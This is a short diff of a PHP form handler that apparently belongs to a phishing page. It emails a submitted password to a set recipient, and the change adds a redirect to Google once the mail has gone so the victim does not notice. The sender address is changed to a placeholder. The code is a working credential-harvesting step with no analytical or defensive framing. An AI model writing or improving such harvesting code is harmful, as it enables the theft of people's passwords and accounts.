@@ -14,11 +14,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Contraseña: " . $password;
 
     // Cabeceras del correo electrónico
-    $headers = "From: armin5727214@gmail.com";
+    $headers = "From: tu_correo_electronico@gmail.com";
 
     // Envía el correo electrónico
     if (mail($to, $subject, $message, $headers)) {
         echo "Correo electrónico enviado con éxito.";
+        // Redirige a Google después de enviar el correo electrónico
+        header("Location: https://www.google.com");
+        exit;
     } else {
         echo "Error al enviar el correo electrónico.";
     }
